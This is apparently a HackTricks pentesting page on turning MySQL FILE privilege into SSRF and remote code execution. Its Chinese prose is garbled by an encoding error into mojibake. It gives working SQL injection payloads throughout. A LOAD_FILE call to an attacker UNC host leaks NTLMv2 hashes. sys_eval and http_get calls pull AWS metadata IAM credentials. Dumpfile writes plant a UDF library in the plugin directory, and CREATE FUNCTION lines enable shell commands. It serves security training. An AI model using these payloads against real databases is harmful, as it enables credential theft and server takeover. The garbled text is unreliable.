# MySQL File priv åˆ° SSRF/RCE

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

### LOAD\_FILE/LOAD DATA/LOAD XML åˆ° SSRF

æ¯ç¯‡å…³äºSQLå¸¦å¤–æ•°æ®æ³„éœ²çš„æ–‡ç« éƒ½ä¼šä½¿ç”¨`LOAD_FILE()`å­—ç¬¦ä¸²å‡½æ•°æ¥å‘èµ·ç½‘ç»œè¯·æ±‚ã€‚è¯¥å‡½æ•°æœ¬èº«åŸºäºå…¶è¿è¡Œçš„æ“ä½œç³»ç»Ÿå’Œæ•°æ®åº“å¯åŠ¨æ—¶çš„è®¾ç½®æœ‰è‡ªå·±çš„é™åˆ¶ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœå…¨å±€å˜é‡`secure_file_priv`æ²¡æœ‰è®¾ç½®ï¼Œ[é»˜è®¤å€¼è®¾ç½®ä¸º`/var/lib/mysql-files/`](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html)ï¼Œè¿™æ„å‘³ç€æ‚¨åªèƒ½ä½¿ç”¨åƒ`LOAD_FILE('filename')`æˆ–`LOAD DATA [LOCAL] INFILE 'filename' INTO TABLE tablename`è¿™æ ·çš„å‡½æ•°ä»`/var/lib/mysql-files/`ç›®å½•è¯»å–æ–‡ä»¶ã€‚è¦èƒ½å¤Ÿå¯¹è¯¥ç›®å½•å¤–çš„æ–‡ä»¶è¿›è¡Œè¯»å–ï¼Œå¿…é¡»å°†`secure_file_priv`é€‰é¡¹è®¾ç½®ä¸º`""`ï¼Œè¿™åªèƒ½é€šè¿‡æ›´æ–°æ•°æ®åº“é…ç½®æ–‡ä»¶æˆ–å°†`--secure_file_priv=""`ä½œä¸ºå¯åŠ¨å‚æ•°ä¼ é€’ç»™æ•°æ®åº“æœåŠ¡æ¥å®Œæˆã€‚

å°½ç®¡å¦‚æ­¤ï¼Œåœ¨`secure_file_priv`è®¾ç½®ä¸º`""`çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åº”è¯¥èƒ½å¤Ÿè¯»å–ç³»ç»Ÿä¸Šçš„å…¶ä»–æ–‡ä»¶ï¼Œå‰ææ˜¯æ–‡ä»¶è¯»å–æƒé™å’Œ`mysql.user`ä¸­å½“å‰æ•°æ®åº“ç”¨æˆ·çš„`file_priv`è®¾ç½®ä¸º`Y`ã€‚ç„¶è€Œï¼Œèƒ½å¦ä½¿ç”¨è¿™äº›å‡½æ•°è¿›è¡Œç½‘ç»œè°ƒç”¨éå¸¸ä¾èµ–äºæ“ä½œç³»ç»Ÿã€‚ç”±äºè¿™äº›å‡½æ•°ä»…ç”¨äºè¯»å–æ–‡ä»¶ï¼Œå”¯ä¸€ä¸ç½‘ç»œç›¸å…³çš„è°ƒç”¨æ˜¯å¯¹Windowsä¸»æœºä¸Šçš„UNCè·¯å¾„ï¼Œå› ä¸º[Windowsçš„`CreateFileA` APIåœ¨è®¿é—®æ–‡ä»¶æ—¶ç†è§£UNCå‘½åçº¦å®š](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file)ã€‚

å› æ­¤ï¼Œå¦‚æœæ‚¨çš„ç›®æ ‡æ•°æ®åº“è¿è¡Œåœ¨Windowsæœºå™¨ä¸Šï¼Œæ³¨å…¥æŸ¥è¯¢`x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //`å°†[å¯¼è‡´Windowsæœºå™¨åœ¨å°è¯•ä½¿ç”¨æ”»å‡»è€…æ§åˆ¶çš„`\\attackerserver.example.com`è¿›è¡Œè®¤è¯æ—¶å‘é€å‡ºNTLMv2å“ˆå¸Œ](https://packetstormsecurity.com/files/140832/MySQL-OOB-Hacking.html)ã€‚

è¿™ç§æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ è™½ç„¶æœ‰ç”¨ï¼Œä½†ä»…é™äºTCPç«¯å£445ã€‚æ‚¨ä¸èƒ½æ§åˆ¶ç«¯å£å·ï¼Œä½†å¯ä»¥ä»è®¾ç½®äº†å®Œå…¨è¯»å–æƒé™çš„å…±äº«ä¸­è¯»å–ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œæ­£å¦‚æ—©æœŸç ”ç©¶æ‰€ç¤ºï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è¿™ç§æœ‰é™çš„SSRFèƒ½åŠ›æ¥çªƒå–å“ˆå¸Œå¹¶ä¸­ç»§å®ƒä»¬ä»¥è·å–shellï¼Œæ‰€ä»¥å®ƒç»å¯¹æœ‰ç”¨ã€‚

### ç”¨æˆ·å®šä¹‰çš„å‡½æ•°åˆ°RCE

MySQLæ•°æ®åº“çš„å¦ä¸€ä¸ªé…·ç‚«æŠ€æœ¯æ˜¯èƒ½å¤Ÿä½¿ç”¨å­˜åœ¨äºå¤–éƒ¨åº“æ–‡ä»¶ä¸­çš„ç”¨æˆ·å®šä¹‰å‡½æ•°ï¼ˆUDFï¼‰ï¼Œå¦‚æœè¿™äº›åº“æ–‡ä»¶ä½äºç‰¹å®šä½ç½®æˆ–ç³»ç»Ÿ$PATHä¸­ï¼Œåˆ™å¯ä»¥ä»MySQLå†…éƒ¨è®¿é—®ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨SQLæ³¨å…¥æ¥**ç¼–å†™åº“ï¼ˆ`.so`æˆ–`.dll`**å–å†³äºLinuxæˆ–Windowsï¼‰ï¼ŒåŒ…å«å¯ä»¥è¿›è¡Œç½‘ç»œ/HTTPè¯·æ±‚çš„ç”¨æˆ·å®šä¹‰å‡½æ•°ï¼Œç„¶åé€šè¿‡é¢å¤–çš„æŸ¥è¯¢è°ƒç”¨å®ƒã€‚

è¿™æœ‰è‡ªå·±çš„ä¸€å¥—é™åˆ¶ã€‚æ ¹æ®MySQLçš„ç‰ˆæœ¬ï¼Œæ‚¨å¯ä»¥é€šè¿‡`select @@version`æ¥è¯†åˆ«ï¼Œå¯ä»¥ä»ä¸­åŠ è½½æ’ä»¶çš„ç›®å½•å—åˆ°é™åˆ¶ã€‚MySQLåœ¨`v5.0.67`ä»¥ä¸‹å…è®¸ä»ç³»ç»Ÿè·¯å¾„åŠ è½½åº“æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®`plugin_dir`å˜é‡ã€‚ç°åœ¨è¿™å·²ç»æ”¹å˜ï¼Œæ–°ç‰ˆæœ¬å°†**`plugin_dir`**å˜é‡è®¾ç½®ä¸ºç±»ä¼¼äº`/usr/lib/mysql/plugin/`çš„å†…å®¹ï¼Œé€šå¸¸ç”±rootæ‹¥æœ‰ã€‚

åŸºæœ¬ä¸Š**è¦é€šè¿‡SQLæ³¨å…¥å°†è‡ªå®šä¹‰åº“åŠ è½½åˆ°MySQLå¹¶é€šè¿‡åŠ è½½çš„åº“è°ƒç”¨å‡½æ•°ï¼Œæ‚¨éœ€è¦**ï¼š

* èƒ½å¤Ÿé€šè¿‡SQLæ³¨å…¥**å†™å…¥**æŒ‡å®šåœ¨**`@@plugin_dir`**ä¸­çš„**ä½ç½®**
* `mysql.user`ä¸­å½“å‰æ•°æ®åº“ç”¨æˆ·çš„**`file_priv`**è®¾ç½®ä¸º**`Y`**
* **`secure_file_priv`**è®¾ç½®ä¸º**`""`**ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥ä»ä»»æ„ä½ç½®ï¼ˆå¦‚ç½‘ç»œæˆ–Webåº”ç”¨ç¨‹åºä¸­çš„æ–‡ä»¶ä¸Šä¼ ç›®å½•ï¼‰è¯»å–åº“çš„åŸå§‹å­—èŠ‚ã€‚

å‡è®¾æ»¡è¶³ä¸Šè¿°æ¡ä»¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨**ä¼ ç»Ÿæ–¹æ³•å°†**[**æµè¡Œçš„MySQL UDF `lib_mysqludf_sys`åº“**](https://github.com/mysqludf/lib\_mysqludf\_sys) **ä¼ è¾“åˆ°æ•°æ®åº“æœåŠ¡å™¨**ã€‚ç„¶åæ‚¨å¯ä»¥ä½¿ç”¨å¦‚`cURL`æˆ–`powershell wget`è¿™æ ·çš„æ“ä½œç³»ç»Ÿå‘½ä»¤è¯·æ±‚æ¥æ‰§è¡ŒSSRFï¼Œä½¿ç”¨ä»¥ä¸‹è¯­æ³•

`x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

è¿™ä¸ªåº“ä¸­å£°æ˜äº†å¾ˆå¤šå…¶ä»–å‡½æ•°ï¼Œå¯ä»¥åœ¨[è¿™é‡Œ](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/)çœ‹åˆ°åˆ†æã€‚å¦‚æœæ‚¨åƒæˆ‘ä¸€æ ·æ‡’ï¼Œå¯ä»¥ä»metasploitå®‰è£…ä¸­çš„`/usr/share/metasploit-framework/data/exploits/mysql/`ç›®å½•è·å–è¿™ä¸ªUDFåº“çš„ç›®æ ‡OSå‰¯æœ¬å¹¶å¼€å§‹ä½¿ç”¨ã€‚

æˆ–è€…ï¼Œå·²ç»åˆ›å»ºäº†UDFåº“ï¼Œä¸“é—¨æä¾›æ•°æ®åº“è¿›è¡ŒHTTPè¯·æ±‚çš„èƒ½åŠ›ã€‚æ‚¨å¯ä»¥ä½¿ç”¨[MySQLç”¨æˆ·å®šä¹‰å‡½æ•°ï¼ˆUDFï¼‰è¿›è¡ŒHTTP GET/POST](https://github.com/y-ken/mysql-udf-http)æ¥è®©æ•°æ®åº“è¿›è¡ŒHTTPè¯·æ±‚ï¼Œä½¿ç”¨ä»¥ä¸‹è¯­æ³•

`x'; SELECT http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

æ‚¨ä¹Ÿå¯ä»¥[åˆ›å»ºè‡ªå·±çš„UDFå¹¶åœ¨äº‹ååˆ©ç”¨ä¸­ä½¿ç”¨å®ƒã€‚](https://pure.security/simple-mysql-backdoor-using-user-defined-functions/)

æ— è®ºå¦‚ä½•ï¼Œæ‚¨éœ€è¦å°†åº“ä¼ è¾“åˆ°æ•°æ®åº“æœåŠ¡å™¨ã€‚æ‚¨å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼åšåˆ°è¿™ä¸€ç‚¹

1. ä½¿ç”¨MySQLçš„`hex()`å­—ç¬¦ä¸²å‡½æ•°æˆ–ç±»ä¼¼`xxd -p filename.so | tr -d '\n'`å°†åº“çš„å†…å®¹è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ ¼å¼ï¼Œç„¶åä½¿ç”¨`x'; SELECT unhex(0x1234abcd12abcdef1223.....) into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`å°†å…¶è½¬å‚¨åˆ°`@@plugin_dir`ç›®å½•
2. æˆ–è€…ï¼Œå°†`filename.so`çš„å†…å®¹è½¬æ¢ä¸ºbase64å¹¶ä½¿ç”¨`x';select from_base64("AAAABB....") into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`

å¦‚æœ`@@plugin_dir`ä¸å¯å†™ï¼Œé‚£ä¹ˆå¦‚æœç‰ˆæœ¬é«˜äº`v5.0.67`ï¼Œæ‚¨å°±æ²¡æœ‰è¿æ°”äº†ã€‚å¦åˆ™ï¼Œå†™å…¥è·¯å¾„ä¸­çš„ä¸åŒä½ç½®ï¼Œå¹¶ä»é‚£é‡ŒåŠ è½½UDFåº“

* å¯¹äº`lib_mysqludf_sys`åº“ - `x';create function sys_eval returns string soname 'lib_mysqludf_sys.so'; -- //`
* å¯¹äº`mysql-udf-http`åº“ - `x';create function http_get returns string soname 'mysql-udf-http.so'; -- //`


å¯¹äºè‡ªåŠ¨åŒ–è¿™ä¸ªè¿‡ç¨‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨SQLMapï¼Œå®ƒæ”¯æŒ[é€šè¿‡`--udf-inject`é€‰é¡¹ä½¿ç”¨è‡ªå®šä¹‰UDF](https://github.com/sqlmapproject/sqlmap/wiki/Usage)ã€‚

å¯¹äºç›²SQLæ³¨å…¥ï¼Œæ‚¨å¯ä»¥å°†UDFå‡½æ•°çš„è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªä¸´æ—¶è¡¨ï¼Œç„¶åä»é‚£é‡Œè¯»å–æ•°æ®ï¼Œæˆ–è€…ä½¿ç”¨[åœ¨`sys_eval`æˆ–`sys_exec` curlå‘½ä»¤ä¸­å·è¿çš„DNSè¯·æ±‚](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)ã€‚

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
